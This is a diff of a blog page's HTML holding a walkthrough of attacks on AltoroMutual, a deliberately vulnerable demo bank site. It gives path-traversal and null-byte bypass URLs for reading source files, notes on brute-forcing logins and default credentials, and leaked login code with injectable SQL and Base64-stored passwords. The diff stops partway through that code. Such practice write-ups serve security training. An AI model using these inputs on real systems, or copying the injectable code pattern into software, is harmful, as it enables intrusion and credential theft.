@@ -3,8 +3,8 @@
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="keywords" content="hacking, security, wargames, web, appsec">
-        <meta name="description" content="Contents 1 IntroductionÂ 2 Vulnerabilities by URL 2.1 /default.aspx?content= 2.2 /bank 2.3 /bank/login.aspx 2.3.1 Brute force vulnerability 2.3.2 SQL injection using POST parameters 2.3.3 Base64-encoded login credentials 2.4 /bank/main.aspxÂ 2.4.1 Source code ...">
+        <meta name="keywords" content="hacking, security, wargames, web, appsec, xss">
+        <meta name="description" content="Introduction AltoroMutual is an vulnerable-by-design web application created by WatchFire (now AppScan Standard) as a demo test application for their BlackBox Scanner. (Source:https://www.owasp.org/index.php/AltoroMutual) The demo can be found at http://demo.testfire.net/. Vulnerabilities /default.aspx?content= There is a file inclusion vulnerability ...">
         <title>Hacking Altoro Mutual - blog.dornea.nu</title>
         <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
         <link rel="stylesheet" href="/css/ipython.min.css" type="text/css" />
@@ -57,10 +57,13 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (154)</a></li>
+                                      (101)</a></li>
+                               <li><a href="http://blog.dornea.nu/category/low">
+                                   <i class="icon-folder-close"></i>LOW
+                                      (27)</a></li>
                                <li><a href="http://blog.dornea.nu/category/notes">
                                       <i class="icon-book"></i>notes
-                                      (8)</a></li>
+                                      (18)</a></li>
                            </ul>
                         </li>
                         <!--  self defined dropdown list -->
@@ -114,78 +117,23 @@
             </div>
             <div id="niu2-left-container" class="col-md-6 col-md-offset-2 with-right-border">
                 <div id="niu2-main-content">
-                    <div class="toc_wrap_right toc_transparent no_bullets" id="toc_container">
-<p class="toc_title">
-    Contents
-  </p>
-<ul class="toc_list">
-<li>
-<a href="#Introduction"><span class="toc_number toc_depth_1">1</span> IntroductionÂ </a>
-</li>
-<li>
-<a href="#Vulnerabilities_by_URL"><span class="toc_number toc_depth_1">2</span> Vulnerabilities by URL</a><ul>
-<li>
-<a href="#defaultaspxcontent"><span class="toc_number toc_depth_2">2.1</span> /default.aspx?content=</a>
-</li>
-<li>
-<a href="#bank"><span class="toc_number toc_depth_2">2.2</span> /bank</a>
-</li>
-<li>
-<a href="#bankloginaspx"><span class="toc_number toc_depth_2">2.3</span> /bank/login.aspx</a><ul>
-<li>
-<a href="#Brute_force_vulnerability"><span class="toc_number toc_depth_3">2.3.1</span> Brute force vulnerability</a>
-</li>
-<li>
-<a href="#SQL_injection_using_POST_parameters"><span class="toc_number toc_depth_3">2.3.2</span> SQL injection using POST parameters</a>
-</li>
-<li>
-<a href="#Base64-encoded_login_credentials"><span class="toc_number toc_depth_3">2.3.3</span> Base64-encoded login credentials</a>
-</li>
-</ul>
-</li>
-<li>
-<a href="#bankmainaspx"><span class="toc_number toc_depth_2">2.4</span> /bank/main.aspxÂ </a><ul>
-<li>
-<a href="#Source_code_disclosure"><span class="toc_number toc_depth_3">2.4.1</span> Source code disclosure</a>
-</li>
-<li>
-<a href="#SQL_injection_using_Cookie_data"><span class="toc_number toc_depth_3">2.4.2</span> SQL injection using Cookie data</a>
-</li>
-<li>
-<a href="#XSS_using_cookie_data"><span class="toc_number toc_depth_3">2.4.3</span> XSS using cookie data</a>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</div>
-<h1 id="3d259698b7b1fa955b8b4bfd78c184d3"><span id="Introduction">IntroductionÂ </span></h1>
-<hr/>
-<p>AltoroMutual is an vulnerable-by-design web application created byÂ !WatchFire (nowÂ !AppScan Standard) as a demo test application for theirÂ !BlackBox Scanner. (Source:<a href="https://www.owasp.org/index.php/AltoroMutual">https://www.owasp.org/index.php/AltoroMutual</a>)</p>
-<p>The demo can be found atÂ <a href="http://demo.testfire.net/">http://demo.testfire.net/</a>.</p>
-<p><strong>This is not an usual wargame!</strong>Â I have simply not found an appropriate name for it.<!--more--></p>
-<p> </p>
-<h1 id="5aa530919b62444243ee30a0ef52aee1"><span id="Vulnerabilities_by_URL">Vulnerabilities by URL</span></h1>
-<hr/>
-<p> </p>
-<h2 id="765f6e48248fbc7c4d9648b544f5e5c6"><span id="defaultaspxcontent">/default.aspx?content=</span></h2>
-<hr/>
-<p>There is aÂ <strong>file inclusion vulnerability</strong>Â which we’ll use for further investigation. URLÂ <em><a href="http://demo.testfire.net/default.aspx?content=../testing.txt">http://demo.testfire.net/default.aspx?content=../testing.txt</a></em>Â will show:</p>
-<pre>An Error Has Occurred
+                    <h2 id="0b79795d3efc95b9976c7c5b933afce2">Introduction</h2>
+<p>AltoroMutual is an vulnerable-by-design web application created by WatchFire (now AppScan Standard) as a demo test application for their BlackBox Scanner. (Source:<a href="https://www.owasp.org/index.php/AltoroMutual">https://www.owasp.org/index.php/AltoroMutual</a>)</p>
+<p>The demo can be found at <a href="http://demo.testfire.net/">http://demo.testfire.net/</a>.</p>
+<h2 id="535e2de9168013bbfc31965016086243">Vulnerabilities</h2>
+<h3 id="765f6e48248fbc7c4d9648b544f5e5c6">/default.aspx?content=</h3>
+<p>There is a <strong>file inclusion vulnerability</strong> which we'll use for further investigation. URL <em><a href="http://demo.testfire.net/default.aspx?content=../testing.txt">http://demo.testfire.net/default.aspx?content=../testing.txt</a></em> will show:</p>
+<div class="highlight"><pre>An Error Has Occurred
 Summary:
 Could not find file 'D:downloadsAltoroMutual_v6website  esting.txt'.
 Error Message:
 System.IO.FileNotFoundException: Could not find file 'D:downloadsAltoroMutual_v6website esting.txt'. File name: 'D:downloadsAltoroMutual_v6website  esting.txt' at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath) at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy) at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options) at System.IO.StreamReader..ctor(String path, Encoding encoding, Boolean detectEncodingFromByteOrderMarks, Int32 bufferSize) at System.IO.StreamReader..ctor(String path) at System.IO.File.OpenText(String path) at Altoro.Default.LoadFile(String myFile) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 42 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 70 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
-</pre>
-<p>As you can see we have found the root path of the web application which is atÂ <strong>D:downloads!AltoroMutual_v6website</strong>.</p>
-<p><a href="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" title="attachment:default.aspx.png"><br/>
-<img alt="File inclusion vulnerability" class="img-responsive" height="548" src="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" title="attachment:default.aspx.png" width="1007"/></a></p>
-<p> </p>
-<h2 id="0b6275b4fd4340d418195012eb027c55"><span id="bank">/bank</span></h2>
+</pre></div>
+<p>As you can see we have found the root path of the web application which is at <code>D:downloads!AltoroMutual_v6website</code>.</p>
+<h2 id="0b6275b4fd4340d418195012eb027c55">/bank</h2>
 <hr/>
-<p>You’ll find aÂ <strong>directory listening</strong>Â atÂ <a href="http://demo.testfire.net/bank/">http://demo.testfire.net/bank/</a>Â which will show you a lot of information about the applications functionalities.</p>
-<pre>5/31/2007 11:10 AM        &lt;dir&gt; 20060308_bak
+<p>You'll find a <strong>directory listening</strong> at <a href="http://demo.testfire.net/bank/">http://demo.testfire.net/bank/</a> which will show you a lot of information about the applications functionalities.</p>
+<div class="highlight"><pre> 5/31/2007 11:10 AM        &lt;dir&gt; 20060308_bak
  1/12/2011 10:14 PM         1831 account.aspx
  1/12/2011 10:14 PM         4277 account.aspx.cs
  1/12/2011 10:14 PM          771 apply.aspx
@@ -210,192 +158,183 @@ System.IO.FileNotFoundException: Could not find file 'D:downloadsAltoroMutual_v6
  1/12/2011 10:14 PM         3930 transfer.aspx
  1/12/2011 10:14 PM         3505 transfer.aspx.cs
  1/12/2011 10:14 PM           82 ws.asmx
-</pre>
+</pre></div>
 <p>Since the application is written in C# you might want to see whats behind the *.cs files. However clicking on the files will trigger following error message:</p>
-<pre>An Error Has Occurred
+<div class="highlight"><pre>An Error Has Occurred
 Summary:
 An unknown error occurred.
 Error Message:
-</pre>
-<p><a href="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" title="attachment:cant_access_files.png"><img alt="File inclusion vulnerability" class="img-responsive" height="451" src="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" title="attachment:cant_access_files.png" width="NaN"/></a></p>
-<p>So you’ll have to find another way to get to the files. We’ll use theÂ <strong>file inclusion vulnerability</strong>Â found before to do that.</p>
-<p><a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs</a>Â will result in</p>
-<pre>Error! File must be of type TXT or HTM
-</pre>
-<p>We’ll have to bypass the filter in order to get the file. Remember theÂ <strong>null string vulnerability</strong>? Here we go:Â <a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>.</p>
-<p><a href="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" title="attachment:null_string.png"><img alt="Null string vulnerability" class="img-responsive" height="578" src="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" title="attachment:null_string.png" width="NaN"/></a></p>
-<p>That will show you the content ofÂ <em>/bank/login.aspx.cs</em>. Now you can inspect the the source code to find more vulnerabilities.</p>
-<p> </p>
-<h2 id="65497bf7a464b98772b9026e8870b752"><span id="bankloginaspx">/bank/login.aspx</span></h2>
-<hr/>
-<p>Â Source code disclosure</p>
+</pre></div>
+<p>So you'll have to find another way to get to the files. We'll use the <strong>file inclusion vulnerability</strong> found before to do that.</p>
+<p><a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs</a> will result in</p>
+<div class="highlight"><pre>Error! File must be of type TXT or HTM
+</pre></div>
+<p>We'll have to bypass the filter in order to get the file. Remember the <strong>null string vulnerability</strong>? Here we go: <a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>.</p>
+<p>That will show you the content of <em>/bank/login.aspx.cs</em>. Now you can inspect the the source code to find more vulnerabilities.</p>
+<h2 id="65497bf7a464b98772b9026e8870b752">/bank/login.aspx</h2>
 <p>Here is the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>):</p>
-<pre>using System.Data;
-using System.Data.SqlClient;
-using System.Data.OleDb;
-using System.Text.RegularExpressions;
-using System.Web;
-using System.Web.UI;
-using System.Web.UI.WebControls;
-using System.Web.UI.HtmlControls;
-using System.Configuration;
-namespace Altoro
-{
-  public partial class Authentication : Page
-  {
-    protected void Page_Load(object sender, System.EventArgs e)
-    {
-      // Put user code to initialize the page here
-      Response.Cache.SetCacheability(HttpCacheability.NoCache);
-      HtmlMeta meta = new HtmlMeta();
-      HtmlHead head = (HtmlHead)Page.Header;
-      meta.Name = "keywords";
-      meta.Content = "Altoro Mutual Login, login, authenticate";
-      head.Controls.Add(meta);
-      if(Request.Params["passw"] != null)
-      {
-        String uname = Request.Params["uid"];
-        String passwd = Request.Params["passw"];
-        String msg = ValidateUser(uname, passwd);
-        if (msg == "Success")
-        {
-            Response.Redirect("main.aspx");
-        }
-        else
-        {
-          message.Text = "Login Failed: " + msg;
-        }
-      }
-    }
-    protected string ValidateUser(String uName, String pWord)
-    {
-      //Set default status to Success
-      string status = "Success";
-      OleDbConnection myConnection = new OleDbConnection();
-      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
-      myConnection.Open();
-      string query2 = "SELECT * From users WHERE username = '" + uName + "'";
-      string query1 = query2 + " AND password = '" + pWord + "'";
-      if (ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString.Contains("Microsoft.Jet.OLEDB.4.0"))
-      {
-          // Hack for MS Access which can not terminate a string
-          query1 = Regex.Replace(query1, "--.*", "");
-          query2 = Regex.Replace(query2, "--.*", "");
-      }
-      DataSet ds = new DataSet();
-      OleDbDataAdapter myLogin = new OleDbDataAdapter(query1, myConnection);
-      myLogin.Fill(ds, "user");
-      if (ds.Tables["user"].Rows.Count==0)
-      {
-              OleDbDataAdapter myFailed = new OleDbDataAdapter(query2, myConnection);
-              myFailed.Fill(ds, "user");
-        if (ds.Tables["user"].Rows.Count==0)
-        {
-             status = "We're sorry, but this username was not found in our system.  Please try again.";
-        }
-        else
-        {
-            status = "Your password appears to be invalid.  Please re-enter your password carefully.";
-        }
-      }
-      else
-      {
-                //Get the row returned by the query
-                DataRow myRow = ds.Tables["user"].Rows[0];
-          //Set the Session variables.
-          Session["userId"] = myRow["userid"];
-          Session["userName"] = myRow["username"];
-          Session["firstName"] = myRow["first_name"];
-          Session["lastName"] = myRow["last_name"];
-          Session["authenticated"] = true;
-          //Close the database collection.
-          myConnection.Close();
-          //Set UserInfo cookie
-          DateTime dtNow = DateTime.Now;
-          TimeSpan tsHour = new TimeSpan(0, 0, 180, 0);
-          string sCookieUser = new Base64Decoder(uName).GetDecoded();
-          HttpCookie UserInfo = Request.Cookies["amUserInfo"];
-          if ((UserInfo == null) || (sCookieUser != Session["userName"].ToString()))
-          {
-              UserInfo = new HttpCookie("amUserInfo");
-              UserInfo["UserName"] = new Base64Encoder(uName).GetEncoded();
-              UserInfo["Password"] = new Base64Encoder(pWord).GetEncoded();
-              UserInfo.Expires = dtNow.Add(tsHour);
-              Response.Cookies.Add(UserInfo);
-          }
-          HttpCookie UserId = Request.Cookies["amUserId"];
-          UserId = new HttpCookie("amUserId");
-          UserId.Value = Session["userId"].ToString();
-          Response.Cookies.Add(UserId);
-          query1 = "SELECT userid, approved, card_type,interest, limit FROM promo WHERE userid=" + Session["userId"];
-          OleDbDataAdapter myApproval = new OleDbDataAdapter(query1, myConnection);
-          myApproval.Fill(ds, "promo");
-          DataTable myTable = ds.Tables["promo"];
-          DataRow curRow = myTable.Rows[0];
-          if (System.Convert.ToBoolean(curRow["approved"]))
-          {
-            HttpCookie CreditOffer = Request.Cookies["amCreditOffer"];
-                CreditOffer = new HttpCookie("amCreditOffer");
-            CreditOffer["CardType"] = curRow["card_type"].ToString();
-            CreditOffer["Limit"] = curRow["limit"].ToString();
-            CreditOffer["Interest"] = curRow["interest"].ToString();
-                Response.Cookies.Add(CreditOffer);
-          }
-      }
-      myConnection.Close();
-      return status;
-    }
-      protected string GetUserName()
-      {
-          HttpCookie UserInfo = Request.Cookies["amUserInfo"];
-          if (Request.Params["uid"] != null)
-          {
-              return Request.Params["uid"].ToString();
-          }
-          if (UserInfo != null)
-          {
-              return new Base64Decoder(UserInfo["UserName"]).GetDecoded();
-          }
-          else
-          {
-              return "";
-          }
-      }
-    #region Web Form Designer generated code
-    override protected void OnInit(EventArgs e)
-    {
-      //
-      // CODEGEN: This call is required by the ASP.NET Web Form Designer.
-      //
-      InitializeComponent();
-      base.OnInit(e);
-    }
-    /// &lt;summary&gt;
-    /// Required method for Designer support - do not modify
-    /// the contents of this method with the code editor.
-    /// &lt;/summary&gt;
-    private void InitializeComponent()
-    {
-    }
-    #endregion
-  }
-}
-</pre>
-<p> </p>
-<h3 id="c6c7fb86f055418b430d443a7f425228"><span id="Brute_force_vulnerability">Brute force vulnerability</span></h3>
-<p>Before we investigate the code, let’s have a look at a much common vulnerability. Go toÂ <a href="http://demo.testfire.net/bank/login.aspx">http://demo.testfire.net/bank/login.aspx</a>Â and use a random user for the login process. You’ll get:</p>
-<pre>Login Failed: We're sorry, but this username was not found in our system. Please try again.
-</pre>
-<p><a href="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" title="attachment:login_bad_username.png"><img alt="Username bruteforce vulnerability" class="img-responsive" height="581" src="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" title="attachment:login_bad_username.png" width="NaN"/></a></p>
-<p>You could now easilyÂ <strong>bruteforce</strong>Â common usernames in order to login into the application. The same works with passwords too:Â <em>admin</em>Â seems to be a valid username. Try to bruteforce the password and you’ll get:</p>
-<pre>Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
-</pre>
-<p><a href="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" title="attachment:login_bad_password.png"><img alt="Password bruteforce vulnerability" class="img-responsive" height="579" src="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" title="attachment:login_bad_password.png" width="NaN"/></a></p>
-<p><em>admin:admin</em>Â is a valid username/password combinationÂ <img alt=":-)" class="img-responsive" height="16" src="http://dornea.nu/moin_static196/mandarin/img/smile.png" title="smiley::-)" width="16"/></p>
-<p> </p>
-<h3 id="1893267eeefa97c21a09c4e6d7d15585"><span id="SQL_injection_using_POST_parameters">SQL injection using POST parameters</span></h3>
-<p>Now let’s have a closer look at the source code… Let’s analyze theÂ <em>!ValidateUser</em>Â function:</p>
-<pre>protected string ValidateUser(String uName, String pWord)
+<div class="highlight"><pre><span class="nt">using</span> <span class="nt">System</span><span class="nc">.Data</span><span class="o">;</span>
+<span class="nt">using</span> <span class="nt">System</span><span class="nc">.Data.SqlClient</span><span class="o">;</span>
+<span class="nt">using</span> <span class="nt">System</span><span class="nc">.Data.OleDb</span><span class="o">;</span>
+<span class="nt">using</span> <span class="nt">System</span><span class="nc">.Text.RegularExpressions</span><span class="o">;</span>
+<span class="nt">using</span> <span class="nt">System</span><span class="nc">.Web</span><span class="o">;</span>
+<span class="nt">using</span> <span class="nt">System</span><span class="nc">.Web.UI</span><span class="o">;</span>
+<span class="nt">using</span> <span class="nt">System</span><span class="nc">.Web.UI.WebControls</span><span class="o">;</span>
+<span class="nt">using</span> <span class="nt">System</span><span class="nc">.Web.UI.HtmlControls</span><span class="o">;</span>
+<span class="nt">using</span> <span class="nt">System</span><span class="nc">.Configuration</span><span class="o">;</span>
+<span class="nt">namespace</span> <span class="nt">Altoro</span>
+<span class="p">{</span>
+  <span class="n">public</span> <span class="n">partial</span> <span class="n">class</span> <span class="n">Authentication</span> <span class="o">:</span> <span class="n">Page</span>
+  <span class="err">{</span>
+    <span class="n">protected</span> <span class="n">void</span> <span class="n">Page_Load</span><span class="p">(</span><span class="n">object</span> <span class="n">sender</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
+    <span class="err">{</span>
+      <span class="o">//</span> <span class="n">Put</span> <span class="n">user</span> <span class="n">code</span> <span class="n">to</span> <span class="n">initialize</span> <span class="n">the</span> <span class="k">page</span> <span class="n">here</span>
+      <span class="n">Response</span><span class="o">.</span><span class="n">Cache</span><span class="o">.</span><span class="n">SetCacheability</span><span class="p">(</span><span class="n">HttpCacheability</span><span class="o">.</span><span class="n">NoCache</span><span class="p">);</span>
+      <span class="n">HtmlMeta</span> <span class="n">meta</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HtmlMeta</span><span class="p">();</span>
+      <span class="n">HtmlHead</span> <span class="n">head</span> <span class="o">=</span> <span class="p">(</span><span class="n">HtmlHead</span><span class="p">)</span><span class="n">Page</span><span class="o">.</span><span class="n">Header</span><span class="p">;</span>
+      <span class="n">meta</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s2">"keywords"</span><span class="p">;</span>
+      <span class="n">meta</span><span class="o">.</span><span class="n">Content</span> <span class="o">=</span> <span class="s2">"Altoro Mutual Login, login, authenticate"</span><span class="p">;</span>
+      <span class="n">head</span><span class="o">.</span><span class="n">Controls</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">meta</span><span class="p">);</span>
+      <span class="n">if</span><span class="p">(</span><span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="cp">[</span><span class="s2">"passw"</span><span class="cp">]</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+      <span class="err">{</span>
+        <span class="n">String</span> <span class="n">uname</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="cp">[</span><span class="s2">"uid"</span><span class="cp">]</span><span class="p">;</span>
+        <span class="n">String</span> <span class="n">passwd</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="cp">[</span><span class="s2">"passw"</span><span class="cp">]</span><span class="p">;</span>
+        <span class="n">String</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">ValidateUser</span><span class="p">(</span><span class="n">uname</span><span class="o">,</span> <span class="n">passwd</span><span class="p">);</span>
+        <span class="n">if</span> <span class="p">(</span><span class="n">msg</span> <span class="o">==</span> <span class="s2">"Success"</span><span class="p">)</span>
+        <span class="err">{</span>
+            <span class="n">Response</span><span class="o">.</span><span class="n">Redirect</span><span class="p">(</span><span class="s2">"main.aspx"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nt">else</span>
+        <span class="p">{</span>
+          <span class="n">message</span><span class="o">.</span><span class="n">Text</span> <span class="o">=</span> <span class="s2">"Login Failed: "</span> <span class="o">+</span> <span class="n">msg</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="err">}</span>
+    <span class="err">}</span>
+    <span class="nt">protected</span> <span class="nt">string</span> <span class="nt">ValidateUser</span><span class="o">(</span><span class="nt">String</span> <span class="nt">uName</span><span class="o">,</span> <span class="nt">String</span> <span class="nt">pWord</span><span class="o">)</span>
+    <span class="p">{</span>
+      <span class="o">//</span><span class="n">Set</span> <span class="k">default</span> <span class="n">status</span> <span class="n">to</span> <span class="n">Success</span>
+      <span class="n">string</span> <span class="n">status</span> <span class="o">=</span> <span class="s2">"Success"</span><span class="p">;</span>
+      <span class="n">OleDbConnection</span> <span class="n">myConnection</span> <span class="o">=</span> <span class="n">new</span> <span class="n">OleDbConnection</span><span class="p">();</span>
+      <span class="n">myConnection</span><span class="o">.</span><span class="n">ConnectionString</span> <span class="o">=</span> <span class="n">ConfigurationManager</span><span class="o">.</span><span class="n">ConnectionStrings</span><span class="cp">[</span><span class="s2">"DBConnStr"</span><span class="cp">]</span><span class="o">.</span><span class="n">ConnectionString</span><span class="p">;</span>
+      <span class="n">myConnection</span><span class="o">.</span><span class="n">Open</span><span class="p">();</span>
+      <span class="n">string</span> <span class="n">query2</span> <span class="o">=</span> <span class="s2">"SELECT * From users WHERE username = '"</span> <span class="o">+</span> <span class="n">uName</span> <span class="o">+</span> <span class="s2">"'"</span><span class="p">;</span>
+      <span class="n">string</span> <span class="n">query1</span> <span class="o">=</span> <span class="n">query2</span> <span class="o">+</span> <span class="s2">" AND password = '"</span> <span class="o">+</span> <span class="n">pWord</span> <span class="o">+</span> <span class="s2">"'"</span><span class="p">;</span>
+      <span class="n">if</span> <span class="p">(</span><span class="n">ConfigurationManager</span><span class="o">.</span><span class="n">ConnectionStrings</span><span class="cp">[</span><span class="s2">"DBConnStr"</span><span class="cp">]</span><span class="o">.</span><span class="n">ConnectionString</span><span class="o">.</span><span class="n">Contains</span><span class="p">(</span><span class="s2">"Microsoft.Jet.OLEDB.4.0"</span><span class="p">))</span>
+      <span class="err">{</span>
+          <span class="o">//</span> <span class="n">Hack</span> <span class="n">for</span> <span class="n">MS</span> <span class="n">Access</span> <span class="n">which</span> <span class="n">can</span> <span class="n">not</span> <span class="n">terminate</span> <span class="n">a</span> <span class="n">string</span>
+          <span class="n">query1</span> <span class="o">=</span> <span class="n">Regex</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">query1</span><span class="o">,</span> <span class="s2">"--.*"</span><span class="o">,</span> <span class="s2">""</span><span class="p">);</span>
+          <span class="n">query2</span> <span class="o">=</span> <span class="n">Regex</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">query2</span><span class="o">,</span> <span class="s2">"--.*"</span><span class="o">,</span> <span class="s2">""</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="nt">DataSet</span> <span class="nt">ds</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">DataSet</span><span class="o">();</span>
+      <span class="nt">OleDbDataAdapter</span> <span class="nt">myLogin</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">OleDbDataAdapter</span><span class="o">(</span><span class="nt">query1</span><span class="o">,</span> <span class="nt">myConnection</span><span class="o">);</span>
+      <span class="nt">myLogin</span><span class="nc">.Fill</span><span class="o">(</span><span class="nt">ds</span><span class="o">,</span> <span class="s2">"user"</span><span class="o">);</span>
+      <span class="nt">if</span> <span class="o">(</span><span class="nt">ds</span><span class="nc">.Tables</span><span class="cp">[</span><span class="s2">"user"</span><span class="cp">]</span><span class="nc">.Rows.Count</span><span class="o">==</span><span class="nt">0</span><span class="o">)</span>
+      <span class="p">{</span>
+              <span class="n">OleDbDataAdapter</span> <span class="n">myFailed</span> <span class="o">=</span> <span class="n">new</span> <span class="n">OleDbDataAdapter</span><span class="p">(</span><span class="n">query2</span><span class="o">,</span> <span class="n">myConnection</span><span class="p">);</span>
+              <span class="n">myFailed</span><span class="o">.</span><span class="n">Fill</span><span class="p">(</span><span class="n">ds</span><span class="o">,</span> <span class="s2">"user"</span><span class="p">);</span>
+        <span class="n">if</span> <span class="p">(</span><span class="n">ds</span><span class="o">.</span><span class="n">Tables</span><span class="cp">[</span><span class="s2">"user"</span><span class="cp">]</span><span class="o">.</span><span class="n">Rows</span><span class="o">.</span><span class="n">Count</span><span class="o">==</span><span class="m">0</span><span class="p">)</span>
+        <span class="err">{</span>
+             <span class="n">status</span> <span class="o">=</span> <span class="s2">"We're sorry, but this username was not found in our system.  Please try again."</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nt">else</span>
+        <span class="p">{</span>
+            <span class="n">status</span> <span class="o">=</span> <span class="s2">"Your password appears to be invalid.  Please re-enter your password carefully."</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="err">}</span>
+      <span class="nt">else</span>
+      <span class="p">{</span>
+                <span class="o">//</span><span class="n">Get</span> <span class="n">the</span> <span class="n">row</span> <span class="n">returned</span> <span class="n">by</span> <span class="n">the</span> <span class="n">query</span>
+                <span class="n">DataRow</span> <span class="n">myRow</span> <span class="o">=</span> <span class="n">ds</span><span class="o">.</span><span class="n">Tables</span><span class="cp">[</span><span class="s2">"user"</span><span class="cp">]</span><span class="o">.</span><span class="n">Rows</span><span class="cp">[</span><span class="mi">0</span><span class="cp">]</span><span class="p">;</span>
+          <span class="o">//</span><span class="n">Set</span> <span class="n">the</span> <span class="n">Session</span> <span class="n">variables</span><span class="o">.</span>
+          <span class="n">Session</span><span class="cp">[</span><span class="s2">"userId"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">myRow</span><span class="cp">[</span><span class="s2">"userid"</span><span class="cp">]</span><span class="p">;</span>
+          <span class="n">Session</span><span class="cp">[</span><span class="s2">"userName"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">myRow</span><span class="cp">[</span><span class="s2">"username"</span><span class="cp">]</span><span class="p">;</span>
+          <span class="n">Session</span><span class="cp">[</span><span class="s2">"firstName"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">myRow</span><span class="cp">[</span><span class="s2">"first_name"</span><span class="cp">]</span><span class="p">;</span>
+          <span class="n">Session</span><span class="cp">[</span><span class="s2">"lastName"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">myRow</span><span class="cp">[</span><span class="s2">"last_name"</span><span class="cp">]</span><span class="p">;</span>
+          <span class="n">Session</span><span class="cp">[</span><span class="s2">"authenticated"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">true</span><span class="p">;</span>
+          <span class="o">//</span><span class="n">Close</span> <span class="n">the</span> <span class="n">database</span> <span class="n">collection</span><span class="o">.</span>
+          <span class="n">myConnection</span><span class="o">.</span><span class="n">Close</span><span class="p">();</span>
+          <span class="o">//</span><span class="n">Set</span> <span class="n">UserInfo</span> <span class="n">cookie</span>
+          <span class="n">DateTime</span> <span class="n">dtNow</span> <span class="o">=</span> <span class="n">DateTime</span><span class="o">.</span><span class="n">Now</span><span class="p">;</span>
+          <span class="n">TimeSpan</span> <span class="n">tsHour</span> <span class="o">=</span> <span class="n">new</span> <span class="n">TimeSpan</span><span class="p">(</span><span class="m">0</span><span class="o">,</span> <span class="m">0</span><span class="o">,</span> <span class="m">180</span><span class="o">,</span> <span class="m">0</span><span class="p">);</span>
+          <span class="n">string</span> <span class="n">sCookieUser</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Base64Decoder</span><span class="p">(</span><span class="n">uName</span><span class="p">)</span><span class="o">.</span><span class="n">GetDecoded</span><span class="p">();</span>
+          <span class="n">HttpCookie</span> <span class="n">UserInfo</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Cookies</span><span class="cp">[</span><span class="s2">"amUserInfo"</span><span class="cp">]</span><span class="p">;</span>
